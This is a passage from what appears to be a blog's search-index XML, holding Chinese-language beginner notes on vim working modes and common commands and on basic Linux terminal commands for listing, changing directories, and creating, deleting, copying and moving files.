<h2 id="2-vim-的工作模式"><a href="#2-vim-的工作模式" class="headerlink" title="2. vim 的工作模式"></a>2. vim 的工作模式</h2><ul>
<li>命令模式</li>
<li>编辑模式</li>
<li>末行模式</li>
</ul>
<p>说明:<br>  vim 打开文件进入的是命令模式</p>
<p>工作模式效果图:<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/linux/vim%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F.png" alt="工作模式效果图"></p>
<blockquote>
<p>注意点：<br>  编辑模式和末行模式之间不能直接进行切换，都需要通过命令模式来完成。</p>
</blockquote>
<h2 id="3-vim-的末行模式命令"><a href="#3-vim-的末行模式命令" class="headerlink" title="3. vim 的末行模式命令"></a>3. vim 的末行模式命令</h2><ul>
<li>:w 保存</li>
<li>:wq 保存退出</li>
<li>:x 保存退出</li>
<li>:q! 强制退出</li>
</ul>
<h2 id="4-vim-的常用命令"><a href="#4-vim-的常用命令" class="headerlink" title="4. vim 的常用命令"></a>4. vim 的常用命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yy</td>
<td>复制光标所在行</td>
</tr>
<tr>
<td>p</td>
<td>粘贴</td>
</tr>
<tr>
<td>dd</td>
<td>删除/剪切当前行</td>
</tr>
<tr>
<td>V</td>
<td>按行选中</td>
</tr>
<tr>
<td>u</td>
<td>撤销</td>
</tr>
<tr>
<td>ctr+r</td>
<td>反撤销</td>
</tr>
<tr>
<td>&gt;&gt;</td>
<td>往右缩进</td>
</tr>
<tr>
<td>&lt;&lt;</td>
<td>往左缩进</td>
</tr>
<tr>
<td>:/搜索的内容</td>
<td>搜索指定内容</td>
</tr>
<tr>
<td>:%s/要替换的内容/替换后的内容/g</td>
<td>全局替换</td>
</tr>
<tr>
<td>:开始行数,结束行数s/要替换的内容/替换后的内容</td>
<td>局部替换</td>
</tr>
<tr>
<td>.</td>
<td>重复上一次命令操作</td>
</tr>
<tr>
<td>G</td>
<td>回到最后一行</td>
</tr>
<tr>
<td>gg</td>
<td>回到第一行</td>
</tr>
<tr>
<td>数字+G</td>
<td>回到指定行</td>
</tr>
<tr>
<td>shift+6</td>
<td>回到当前行的行首</td>
</tr>
<tr>
<td>shift+4</td>
<td>回到当前行的行末</td>
</tr>
<tr>
<td>ctr+f</td>
<td>下一屏</td>
</tr>
<tr>
<td>ctr+b</td>
<td>上一屏</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>vim 编辑器</title>
    <url>/linux%20%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>记录 linux bash 命令</p>
<span id="more"></span>
<h2 id="0-终端命令说明"><a href="#0-终端命令说明" class="headerlink" title="0. 终端命令说明"></a>0. 终端命令说明</h2><p>command [-options] [parameter]</p>
<ul>
<li>command：命令名, 比如: ls、pwd</li>
<li>[-options]：选项，可以有零个、一个或者多个选项，多个选项可以合并，比如使用的 -r 就是选项。</li>
<li>[parameter]：参数，可以有零个、一个 或者 多个参数， 比如: touch 文件名、mkdir 目录名、cd 目标目录(路径)，这些文件名和目录名都是参数。</li>
<li>[]：代表可选</li>
<li>命令的选项和参数一般情况下没有顺序要求，但是scp命令是必须先选项然后在跟上参数。</li>
</ul>
<h2 id="1-查看目录命令"><a href="#1-查看目录命令" class="headerlink" title="1. 查看目录命令"></a>1. 查看目录命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ls</td>
<td>查看当前目录信息</td>
</tr>
<tr>
<td>tree</td>
<td>以树状方式显示目录信息</td>
</tr>
<tr>
<td>pwd</td>
<td>查看当前目录路径</td>
</tr>
<tr>
<td>clear</td>
<td>清除终端内容</td>
</tr>
</tbody></table>
<h2 id="2-切换目录命令-cd"><a href="#2-切换目录命令-cd" class="headerlink" title="2. 切换目录命令 cd"></a>2. 切换目录命令 cd</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>cd 目录</td>
<td>切换到指定目录</td>
</tr>
<tr>
<td>cd ~</td>
<td>切换到当前用户的主目录</td>
</tr>
<tr>
<td>cd ..</td>
<td>切换到上一级目录</td>
</tr>
<tr>
<td>cd .</td>
<td>切换到当前目录</td>
</tr>
<tr>
<td>cd -</td>
<td>切换到上一次目录</td>
</tr>
</tbody></table>
<ul>
<li>绝对路径<ul>
<li>从 / 目录开始</li>
</ul>
</li>
<li>相对路径<ul>
<li>从当前目录开始</li>
</ul>
</li>
</ul>
<h2 id="3-创建、删除、复制、移动"><a href="#3-创建、删除、复制、移动" class="headerlink" title="3. 创建、删除、复制、移动"></a>3. 创建、删除、复制、移动</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>touch 文件名</td>
<td>创建指定文件</td>
</tr>
<tr>
<td>mkdir 目录名</td>
<td>创建目录(文件夹)</td>
</tr>
<tr>
<td>rm 文件名</td>
<td>删除指定文件</td>
</tr>
<tr>
<td>rm -r 目录名</td>
<td>删除指定目录</td>
</tr>
<tr>
<td>rmdir 目录名</td>
<td>删除空目录</td>
</tr>
<tr>
<td>cp</td>
<td>拷贝文件、拷贝目录</td>
</tr>
<tr>
<td>mv</td>
<td>移动文件、移动目录、重命名</td>
</tr>
</tbody></table>
<ul>
<li>拷贝目录需要加上-r 选项，-r 表示递归拷贝目录及其内容</li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
